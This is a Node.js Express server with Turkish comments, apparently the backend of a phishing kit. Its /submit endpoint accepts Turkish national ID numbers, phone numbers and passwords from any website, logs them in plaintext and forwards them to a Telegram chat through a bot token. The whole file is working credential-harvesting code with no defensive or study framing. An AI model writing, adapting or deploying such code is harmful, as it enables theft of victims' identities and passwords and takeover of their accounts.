const express = require('express');
const axios = require('axios');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config(); // Yerel geliştirme için .env dosyasını yükle (Vercel'de gerek yok, env vars dashboard'dan ayarlanır)

const app = express();
const port = process.env.PORT || 3001; // Vercel'de PORT otomatik atanır, yerel için fallback
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.use(express.json());
app.use(cors({
  origin: '*', // Alan adını belirtmek istemediğin için '*' olarak bıraktım (herhangi bir domain'den istek kabul eder)
  methods: ['POST'], // Sadece POST metoduna izin ver
  allowedHeaders: ['Content-Type'], // İzin verilen header'lar
}));

// Bot token ve Chat ID kontrolü (Vercel'de deployment öncesi env vars'ı kontrol et)
if (!botToken || !chatId) {
  console.error('Hata: BOT_TOKEN veya CHAT_ID eksik. Lütfen environment variables\'ı kontrol edin.');
  process.exit(1); // Yerel için, Vercel'de deployment fail eder
}

app.post('/submit', async (req, res) => {
  const { tc, phone, password } = req.body;

  console.log('[Backend] Alınan veri:', { tc, phone, password, passwordType: typeof password });

  if (!tc || !phone || !password) {
    console.error('[Backend] Eksik veri:', { tc, phone, password });
    return res.status(400).json({ error: 'TC, telefon numarası ve parola zorunludur.' });
  }

  const message = `Yeni Kullanıcı Bilgileri:\nTC: ${tc}\nTelefon: ${phone}\nParola: ${password}`;

  console.log('[Backend] Telegram’a gönderilecek mesaj:', message);

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('[Backend] Telegram mesajı gönderildi:', response.data);
    res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
  } catch (error) {
    console.error('[Backend] Telegram mesajı gönderilemedi:', error.response ? error.response.data : error.message);
    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.' });
  }
});

// Vercel için: Express app'i module olarak export et (Vercel Node.js builder'ı bunu otomatik yönetir)
module.exports = app;

// Yerel geliştirme için server'ı dinle (Vercel'de bu kısım kullanılmaz)
if (process.env.NODE_ENV !== 'production') {
  app.listen(port, () => {
    console.log(`API server http://localhost:${port} adresinde çalışıyor.`);
  }).on('error', (error) => {
    console.error('Sunucu başlatılamadı:', error.message);
    if (error.code === 'EADDRINUSE') {
      console.error(`Port ${port} zaten kullanımda. Lütfen başka bir port deneyin.`);
    }
  });
}